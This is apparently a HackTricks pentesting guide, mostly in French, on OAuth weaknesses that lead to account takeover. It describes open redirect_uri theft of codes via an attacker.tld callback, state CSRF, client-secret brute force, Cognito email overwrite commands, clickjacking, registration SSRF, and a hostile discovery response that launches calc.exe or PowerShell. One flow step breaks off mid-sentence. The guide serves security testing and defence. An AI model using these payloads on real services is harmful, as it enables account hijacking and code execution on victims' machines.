# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## Informations de base <a href="#d4a8" id="d4a8"></a>

OAuth propose plusieurs versions ; des informations de base sont disponibles sur [OAuth 2.0 documentation](https://oauth.net/2/). Cette discussion se concentre principalement sur le [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), qui fournit un **cadre d'autorisation permettant à une application d'accéder au compte d'un utilisateur ou d'effectuer des actions sur celui-ci dans une autre application** (le serveur d'autorisation).

Considérez un site hypothétique _**https://example.com**_, conçu pour **afficher tous vos posts de réseaux sociaux**, y compris les posts privés. Pour cela, OAuth 2.0 est utilisé. _https://example.com_ demandera votre permission pour **accéder à vos posts de réseaux sociaux**. Par conséquent, un écran de consentement apparaîtra sur _https://socialmedia.com_, indiquant les **autorisations demandées et le développeur qui fait la demande**. Après votre autorisation, _https://example.com_ obtiendra la capacité d'**accéder à vos posts en votre nom**.

Il est essentiel de comprendre les composants suivants dans le cadre OAuth 2.0 :

- **resource owner**: Vous, en tant qu'**utilisateur/entité**, autorisez l'accès à votre ressource, comme les posts de votre compte de réseaux sociaux.
- **resource server**: Le **serveur qui gère les requêtes authentifiées** après que l'application ait obtenu un `access token` pour le compte du `resource owner`, par exemple **https://socialmedia.com**.
- **client application**: L'**application qui demande l'autorisation** du `resource owner`, comme **https://example.com**.
- **authorization server**: Le **serveur qui émet les `access tokens`** au `client application` après l'authentification réussie du `resource owner` et l'obtention de l'autorisation, par exemple **https://socialmedia.com**.
- **client_id**: Un identifiant public et unique pour l'application.
- **client_secret:** Une clé confidentielle, connue uniquement de l'application et du serveur d'autorisation, utilisée pour générer des `access_tokens`.
- **response_type**: Une valeur spécifiant **le type de token demandé**, comme `code`.
- **scope**: Le **niveau d'accès** que le `client application` demande au `resource owner`.
- **redirect_uri**: L'**URL vers laquelle l'utilisateur est redirigé après l'autorisation**. Celle-ci doit généralement correspondre à l'URL de redirection pré-enregistrée.
- **state**: Un paramètre pour **conserver des données lors de la redirection de l'utilisateur vers et depuis le serveur d'autorisation**. Son caractère unique est crucial pour servir de **mécanisme de protection CSRF**.
- **grant_type**: Un paramètre indiquant **le type de grant et le type de token à retourner**.
- **code**: Le code d'autorisation émis par le `authorization server`, utilisé conjointement avec `client_id` et `client_secret` par le client pour obtenir un `access_token`.
- **access_token**: Le **token que l'application cliente utilise pour les requêtes API** au nom du `resource owner`.
- **refresh_token**: Permet à l'application d'**obtenir un nouvel `access_token` sans redemander l'utilisateur**.

### Flow

Le **flow OAuth réel** procède comme suit :

1. Vous naviguez vers [https://example.com](https://example.com) et cliquez sur le bouton “Integrate with Social Media”.
2. Le site envoie alors une requête à [https://socialmedia.com](https://socialmedia.com) demandant votre autorisation pour que l'application de https://example.com accède à vos posts. La requête est structurée comme :
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Une page de consentement vous est alors présentée.
4. Après votre approbation, Social Media envoie une réponse au `redirect_uri` avec les paramètres `code` et `state` :
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com utilise ce `code`, ainsi que son `client_id` et son `client_secret`, pour effectuer une requête côté serveur afin d'obtenir un `access_token` en votre nom, permettant l'accès aux autorisations auxquelles vous avez consenti :
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Enfin, le processus se conclut lorsque https://example.com utilise votre `access_token` pour effectuer un appel API vers un réseau social afin d'accéder

## Vulnérabilités <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Selon [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), le serveur d'autorisation doit rediriger le navigateur uniquement vers des **redirect URIs exactes préenregistrées**. Toute faiblesse ici permet à un attaquant d'envoyer une victime via une URL d'autorisation malveillante afin que l'IdP livre le `code` (et le `state`) de la victime directement à un endpoint contrôlé par l'attaquant, qui peut ensuite l'échanger et récupérer les tokens.

Déroulement typique de l'attaque :

1. Construire `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` et l'envoyer à la victime.
2. La victime s'authentifie et approuve les scopes.
3. L'IdP redirige vers `attacker.tld/callback?code=<victim-code>&state=...` où l'attaquant enregistre la requête et échange immédiatement le code.

Bugs de validation courants à tester :

- **No validation** – toute URL absolue est acceptée, entraînant le vol instantané du code.
- **Weak substring/regex checks on the host** – contournement avec des lookalikes tels que `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com` ou `match.com@evil.com`.
- **IDN homograph mismatches** – la validation s'effectue sur la forme punycode (`xn--`), mais le navigateur redirige vers le domaine Unicode contrôlé par l'attaquant.
- **Arbitrary paths on an allowed host** – pointer `redirect_uri` vers `/openredirect?next=https://attacker.tld` ou tout endpoint XSS/contenu-utilisateur divulgue le code soit via des redirections en chaîne, les en-têtes Referer, soit via du JavaScript injecté.
- **Directory constraints without normalization** – des patterns comme `/oauth/*` peuvent être contournés avec `/oauth/../anything`.
- **Wildcard subdomains** – accepter `*.example.com` signifie que toute prise de contrôle (dangling DNS, S3 bucket, etc.) fournit immédiatement un callback valide.
- **Non-HTTPS callbacks** – autoriser des URI `http://` donne aux attaquants réseau (Wi‑Fi, proxy d'entreprise) l'occasion d'intercepter le code en transit.

Passez également en revue les paramètres auxiliaires de type redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) et le document de découverte OpenID (`/.well-known/openid-configuration`) pour d'autres endpoints qui pourraient hériter des mêmes bugs de validation.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Comme mentionné dans ce rapport bug bounty [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), il se peut que l'URL de redirection **soit reflétée dans la réponse** du serveur après l'authentification de l'utilisateur, rendant la page **vulnérable à XSS**. Possible payload to test:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Improper handling of state parameter <a href="#bda5" id="bda5"></a>

Le paramètre `state` est le token CSRF du Authorization Code flow : le client doit générer une **valeur cryptographiquement aléatoire par instance de navigateur**, la persister dans un emplacement lisible uniquement par ce navigateur (cookie, local storage, etc.), l'envoyer dans la requête d'autorisation, et rejeter toute réponse qui ne retourne pas la même valeur. Dès que la valeur est statique, prévisible, optionnelle, ou non liée à la session de l'utilisateur, l'attaquant peut terminer son propre flux OAuth, capturer la requête finale contenant `?code=` (sans l'envoyer), et plus tard contraindre le navigateur de la victime à rejouer cette requête pour que le compte de la victime soit lié au profil de l'attaquant chez l'IdP.

Le schéma de replay est toujours le même :

1. L'attaquant s'authentifie contre l'IdP avec son compte et intercepte le dernier redirect contenant `code` (et éventuellement `state`).
2. Il abandonne cette requête, conserve l'URL, et abuse plus tard de n'importe quel primitive CSRF (link, iframe, formulaire auto-soumis) pour forcer le navigateur de la victime à la charger.
3. Si le client n'applique pas `state`, l'application consomme le résultat d'autorisation de l'attaquant et connecte l'attaquant au compte de la victime dans l'app.

Checklist pratique pour la gestion de `state` pendant les tests :

- **Missing `state` entirely** – si le paramètre n'apparaît jamais, toute la connexion est vulnérable au CSRF.
- **`state` not required** – supprimez-le de la requête initiale ; si l'IdP émet toujours des codes que le client accepte, la défense est optionnelle.
- **Returned `state` not validated** – altérez la valeur dans la réponse (Burp, MITM proxy). Accepter des valeurs non concordantes signifie que le token stocké n'est jamais comparé.
- **Predictable or purely data-driven `state`** – de nombreuses applis insèrent des chemins de redirection ou des blobs JSON dans `state` sans y mélanger d'entropie, permettant aux attaquants de deviner des valeurs valides et de rejouer les flux. Toujours préfixer/suffixer avec une forte entropie avant d'encoder les données.
- **`state` fixation** – si l'appli permet aux utilisateurs de fournir la valeur `state` (p.ex. via des URLs d'autorisation craftées) et la réutilise pendant tout le flux, un attaquant peut verrouiller une valeur connue et la réutiliser sur plusieurs victimes.

PKCE peut compléter `state` (surtout pour les clients publics) en liant l'authorization code à un `code_verifier`, mais les clients web doivent quand même suivre `state` pour prévenir les bugs de CSRF inter-utilisateurs / de linkage de compte.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Sans vérification d'email lors de la création de compte** : des attaquants peuvent créer proactivement un compte en utilisant l'email de la victime. Si la victime utilise ensuite un service tiers pour se connecter, l'application peut involontairement lier ce compte tiers au compte pré-créé de l'attaquant, entraînant un accès non autorisé.
2. **Exploitation d'une vérification d'email laxiste par OAuth** : les attaquants peuvent abuser de services OAuth qui ne vérifient pas les emails en s'inscrivant puis en changeant l'email du compte pour celui de la victime. Cette méthode présente le même risque d'accès non autorisé, similaire au premier scénario mais via un vecteur différent.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

Le `client_id` est volontairement public, mais le **`client_secret` ne doit jamais être récupérable par les utilisateurs finaux**. Les déploiements Authorization Code qui intègrent le secret dans **mobile APKs, desktop clients, or single-page apps** remettent en pratique cette credential à quiconque peut télécharger le package. Inspectez toujours les clients publics en :

- Dépaquetant l'APK/IPA, l'installateur desktop, ou l'app Electron et en recherchant `client_secret`, des blobs Base64 qui décodent en JSON, ou des endpoints OAuth codés en dur.
- Passant en revue les fichiers de config inclus (plist, JSON, XML) ou les chaînes décompilées à la recherche des credentials client.

Une fois que l'attaquant extrait le secret, il lui suffit de voler n'importe quel code d'autorisation de la victime (via un `redirect_uri` faible, des logs, etc.) pour appeler indépendamment `/token` et créer des access/refresh tokens sans impliquer l'app légitime. Considérez les clients publics/natifs comme **incapables de conserver des secrets** — ils devraient plutôt s'appuyer sur PKCE (RFC 7636) pour prouver la possession d'un `code_verifier` par instance plutôt que d'un secret statique. Pendant les tests, vérifiez si PKCE est obligatoire et si le backend rejette réellement les échanges de tokens qui omettent soit le `client_secret` **ou** un `code_verifier` valide.

### Client Secret Bruteforce

Vous pouvez essayer de **bruteforce le `client_secret`** d'un service provider auprès de l'IdP pour tenter de voler des comptes.\
La requête pour le BF peut ressembler à :
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Une fois que le client possède le **code and state**, s'ils sont **réfléchis dans le Referer header** lorsqu'il navigue vers une autre page, alors c'est vulnérable.

### Access Token Stored in Browser History

La garantie principale du Authorization Code grant est que **access tokens never reach the resource owner’s browser**. Quand les implémentations leak des tokens côté client, n'importe quel bug mineur (XSS, Referer leak, proxy logging) devient une compromission instantanée de compte. Vérifiez toujours :

- **Tokens in URLs** – si `access_token` apparaît dans la query/fragment, il se retrouve dans l'historique du navigateur, les logs serveurs, analytics, et les Referer headers envoyés à des tiers.
- **Tokens transiting untrusted middleboxes** – renvoyer des tokens via HTTP ou à travers des proxies de debug/corporate permet aux observateurs réseau de les capturer directement.
- **Tokens stored in JavaScript state** – les stores React/Vue, variables globales ou blobs JSON sérialisés exposent les tokens à chaque script sur l'origine (y compris les payloads XSS ou les extensions malveillantes).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` conservent les tokens longtemps après la déconnexion sur des appareils partagés et sont accessibles par script.

Chacune de ces découvertes élève généralement des bugs autrement “low” (comme un contournement CSP ou un DOM XSS) en takeover complet de l'API, car l'attaquant peut simplement lire et rejouer le leaked bearer token.

### Everlasting Authorization Code

Les Authorization codes doivent être **short-lived, single-use, and replay-aware**. Lors de l'analyse d'un flow, capturez un `code` et :

- **Test the lifetime** – RFC 6749 recommande des minutes, pas des heures. Essayez d'échanger le code après 5–10 minutes ; s'il fonctionne encore, la fenêtre d'exposition pour tout leaked code est excessive.
- **Test sequential reuse** – envoyez le même `code` deux fois. Si la deuxième requête renvoie un autre token, les attaquants peuvent cloner les sessions indéfiniment.
- **Test concurrent redemption/race conditions** – lancez deux requêtes de token en parallèle (Burp intruder, turbo intruder). Les émetteurs faibles accordent parfois les deux.
- **Observe replay handling** – une tentative de réutilisation ne doit pas seulement échouer mais aussi révoquer tout token déjà émis à partir de ce code. Sinon, un replay détecté laisse le premier token de l'attaquant actif.

Combiner un code permissif au replay avec n'importe quel `redirect_uri` ou bug de logging permet un accès persistant au compte même après que la victime ait terminé la connexion légitime.

### Authorization/Refresh Token not bound to client

Si vous pouvez obtenir le **authorization code et l'utiliser avec un client différent**, alors vous pouvez takeover d'autres comptes.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

Dans ce bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) vous pouvez voir que le **token** que **AWS Cognito** renvoie à l'utilisateur pourrait avoir **suffisamment de permissions pour écraser les données utilisateur**. Donc, si vous pouvez **changer l'email d'un utilisateur pour un autre email**, vous pourriez être capable de **take over** les comptes d'autres personnes.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Pour plus d'informations détaillées sur la façon d'abuser d'AWS Cognito, consultez [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

Comme [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), les flux OAuth qui s'attendent à recevoir le **token** (et non un code) peuvent être vulnérables s'ils ne vérifient pas que le token appartient à l'application.

Ceci s'explique parce qu'un **attacker** pourrait créer une **application supporting OAuth and login with Facebook** (par exemple) dans sa propre application. Ensuite, une fois qu'une victime se connecte avec Facebook dans la **attackers application**, l'attaquant pourrait obtenir le **OAuth token of the user given to his application, and use it to login in the victim OAuth application using the victims user token**.

> [!CAUTION]
> Par conséquent, si l'attaquant parvient à faire accéder l'utilisateur à sa propre application OAuth, il pourra prendre le contrôle du compte de la victime dans des applications qui attendent un token et ne vérifient pas si le token a été accordé à leur app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

Selon [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), il était possible de faire ouvrir à une victime une page avec un **returnUrl** pointant vers l'hôte de l'attaquant. Cette information serait **stored in a cookie (RU)** et, dans une **later step**, le **prompt** **ask** l'**user** s'il veut donner l'accès à cet hôte de l'attaquant.

Pour contourner ce prompt, il était possible d'ouvrir un onglet pour initier le **Oauth flow** qui allait définir ce cookie RU en utilisant le **returnUrl**, fermer l'onglet avant que le prompt ne soit affiché, puis ouvrir un nouvel onglet sans cette valeur. Ensuite, le **prompt won't inform about the attackers host**, mais le cookie serait défini sur celui-ci, donc le **token will be sent to the attackers host** lors de la redirection.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Comme expliqué dans [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), certaines implémentations OAuth permettent d'indiquer le paramètre GET **`prompt`** sur None (**`&prompt=none`**) pour **prevent users being asked to confirm** l'accès demandé dans un prompt web si elles sont déjà loggées sur la plateforme.

### response_mode

Comme [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), il peut être possible d'indiquer le paramètre **`response_mode`** pour indiquer où vous voulez que le code soit fourni dans l'URL finale :

- `response_mode=query` -> Le code est fourni dans un paramètre GET : `?code=2397rf3gu93f`
- `response_mode=fragment` -> Le code est fourni dans le fragment de l'URL : `#code=2397rf3gu93f`
- `response_mode=form_post` -> Le code est fourni dans un formulaire POST avec un input appelé `code` et la valeur
- `response_mode=web_message` -> Le code est envoyé via postMessage : `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

Les dialogues de consentement/connexion OAuth sont des cibles idéales pour le Clickjacking : s'ils peuvent être encadrés, un attaquant peut superposer des éléments graphiques personnalisés, cacher les vrais boutons et tromper les utilisateurs pour qu'ils approuvent des scopes dangereux ou lient des comptes. Construisez des PoC qui :

1. Chargez l'IdP authorization URL à l'intérieur d'un `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Utilisez des astuces de positionnement absolu/opacité pour aligner des faux boutons avec les contrôles **Allow**/**Approve** cachés.
3. Optionnellement pré-remplissez des paramètres (scopes, redirect URI) afin que l'approbation volée profite immédiatement à l'attaquant.

Pendant les tests, vérifiez que les pages IdP émettent soit `X-Frame-Options: DENY/SAMEORIGIN` soit une `Content-Security-Policy: frame-ancestors 'none'` restrictive. Si aucune n'est présente, démontrez le risque avec des outils comme [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) et enregistrez la facilité avec laquelle une victime autorise l'app de l'attaquant. Pour d'autres idées de payloads, voir [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

Selon [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), il s'agit d'un flux OAuth qui permet de se connecter via **username** et **password**. Si, durant ce flux simple, un **token** donnant accès à toutes les actions que l'utilisateur peut effectuer est renvoyé, alors il est possible de bypasser le 2FA en utilisant ce token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Ce [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) explique comment il était possible d'abuser d'un **open redirect** basé sur la valeur du **referrer** pour abuser d'OAuth et provoquer un ATO. L'attaque était :

1. La victime accède à la page web de l'attaquant
2. La victime ouvre le lien malveillant et un opener démarre le flux Google OAuth avec `response_type=id_token,code&prompt=none` comme paramètres additionnels en utilisant comme **referrer the attackers website**.
3. Dans l'opener, après que le provider autorise la victime, il la renvoie vers la valeur du paramètre `redirect_uri` (site de la victime) avec un code 30X qui conserve encore le site de l'attaquant dans le referer.
4. Le site de la victime **trigger the open redirect based on the referrer** redirige l'utilisateur vers le site de l'attaquant ; comme le **`respose_type`** était **`id_token,code`**, le code sera renvoyé à l'attaquant dans le **fragment** de l'URL, lui permettant de prendre le contrôle du compte de l'utilisateur via Google sur le site de la victime.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration in OAuth sert de vecteur moins évident mais critique pour des vulnérabilités de sécurité, en particulier pour des attaques de type **Server-Side Request Forgery (SSRF)**. Cet endpoint permet aux serveurs OAuth de recevoir des informations sur les applications clientes, y compris des URLs sensibles qui pourraient être exploitées.

**Points clés :**

- **Dynamic Client Registration** est souvent mappé sur `/register` et accepte des détails comme `client_name`, `client_secret`, `redirect_uris`, et des URLs pour les logos ou les JSON Web Key Sets (JWKs) via des requêtes POST.
- Cette fonctionnalité adhère aux spécifications décrites dans **RFC7591** et **OpenID Connect Registration 1.0**, qui incluent des paramètres potentiellement vulnérables au SSRF.
- Le processus d'enregistrement peut involontairement exposer les serveurs au SSRF de plusieurs façons :
  - **`logo_uri`** : Une URL pour le logo de l'application cliente qui pourrait être fetchée par le serveur, déclenchant un SSRF ou menant à du XSS si l'URL est mal gérée.
  - **`jwks_uri`** : Une URL vers le document JWK du client, qui si elle est malicieusement construite, peut amener le serveur à faire des requêtes sortantes vers un serveur contrôlé par l'attaquant.
  - **`sector_identifier_uri`** : Référence un tableau JSON de `redirect_uris`, que le serveur pourrait récupérer, créant une opportunité SSRF.
  - **`request_uris`** : Liste des request URIs autorisées pour le client, qui peut être exploitée si le serveur récupère ces URIs au début du processus d'autorisation.

**Stratégie d'exploitation :**

- Le SSRF peut être déclenché en enregistrant un nouveau client avec des URLs malveillantes dans des paramètres comme `logo_uri`, `jwks_uri`, ou `sector_identifier_uri`.
- Bien que l'exploitation directe via `request_uris` puisse être atténuée par des contrôles de whitelist, fournir un `request_uri` pré-enregistré et contrôlé par l'attaquant peut faciliter un SSRF pendant la phase d'autorisation.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

La recherche sur [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impactant des clients `mcp-remote` tels que Claude Desktop, Cursor ou Windsurf) montre comment la discovery OAuth dynamique devient une primitive RCE chaque fois que le client transmet les metadata de l'IdP directement au système d'exploitation. Le serveur MCP distant renvoie un `authorization_endpoint` contrôlé par l'attaquant lors de l'échange de discovery (`/.well-known/openid-configuration` ou tout RPC de metadata). `mcp-remote ≤0.1.15` appelait alors le gestionnaire d'URL système (`start`, `open`, `xdg-open`, etc.) avec la chaîne reçue, de sorte que tout scheme/chemin supporté par l'OS s'exécutait localement.

**Attack workflow**

1. Pointez l'agent desktop vers un MCP/OAuth hostile (`npx mcp-remote https://evil`). L'agent reçoit un 401 plus des metadata.
2. Le serveur répond avec du JSON tel que :
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Le client lance le gestionnaire OS pour l'URI fourni. Windows accepte des payloads comme `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux acceptent `file:///Applications/Calculator.app/...` ou même des schémas personnalisés tels que `cmd://bash -lc '<payload>'` s'ils sont enregistrés.
4. Parce que cela se produit avant toute interaction utilisateur, **le simple fait de configurer le client pour qu'il communique avec le serveur de l'attaquant entraîne une exécution de code**.

**Comment tester**

- Ciblez tout client desktop/agent compatible OAuth qui effectue la discovery via HTTP(S) et ouvre localement les endpoints retournés (Electron apps, CLI helpers, thick clients).
- Interceptez ou hébergez la réponse de discovery et remplacez `authorization_endpoint`, `device_authorization_endpoint`, ou des champs similaires par `file://`, `cmd://`, des chemins UNC, ou d'autres schémas dangereux.
- Observez si le client valide le scheme/host. L'absence de validation entraîne une exécution immédiate dans le contexte de l'utilisateur et prouve la vulnérabilité.
- Répétez avec différents schémas pour cartographier toute la surface d'attaque (par ex., `ms-excel:`, `data:text/html,`, custom protocol handlers) et démontrez la portée cross-platform.

## OAuth providers Race Conditions

Si la plateforme que vous testez est un fournisseur OAuth [**lisez ceci pour tester d'éventuelles conditions de concurrence**](race-condition.md).

## Mutable Claims Attack

In OAuth, the sub field uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients use emails or user handles. However, this is risky because:

- Some Authorization Servers do not ensure that these properties (like email) remain immutable.
- In certain implementations—such as **"Login with Microsoft"**—the client relies on the email field, which is **user-controlled by the user in Entra ID** and not verified.
- An attacker can exploit this by creating their own Azure AD organization (e.g., doyensectestorg) and using it to perform a Microsoft login.
- Even though the Object ID (stored in sub) is immutable and secure, the reliance on a mutable email field can enable an account takeover (for example, hijacking an account like victim@gmail.com).

## Client Confusion Attack

In a **Client Confusion Attack**, an application using the OAuth Implicit Flow fails to verify that the final access token is specifically generated for its own Client ID. An attacker sets up a public website that uses Google’s OAuth Implicit Flow, tricking thousands of users into logging in and thereby harvesting access tokens intended for the attacker’s site. If these users also have accounts on another vulnerable website that does not validate the token's Client ID, the attacker can reuse the harvested tokens to impersonate the victims and take over their accounts.

## Scope Upgrade Attack

The **Authorization Code Grant** type involves secure server-to-server communication for transmitting user data. However, if the **Authorization Server** implicitly trusts a scope parameter in the Access Token Request (a parameter not defined in the RFC), a malicious application could upgrade the privileges of an authorization code by requesting a higher scope. After the **Access Token** is generated, the **Resource Server** must verify it: for JWT tokens, this involves checking the JWT signature and extracting data such as client_id and scope, while for random string tokens, the server must query the Authorization Server to retrieve the token’s details.

## Redirect Scheme Hijacking

In mobile OAuth implementations, apps use **custom URI schemes** to receive redirects with Authorization Codes. However, because multiple apps can register the same scheme on a device, the assumption that only the legitimate client controls the redirect URI is violated. On Android, for instance, an Intent URI like `com.example.app://` oauth is caught based on the scheme and optional filters defined in an app’s intent-filter. Since Android’s intent resolution can be broad—especially if only the scheme is specified—an attacker can register a malicious app with a carefully crafted intent filter to hijack the authorization code. This can **enable an account takeover** either through user interaction (when multiple apps are eligible to handle the intent) or via bypass techniques that exploit overly specific filters, as detailed by Ostorlab's assessment flowchart.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
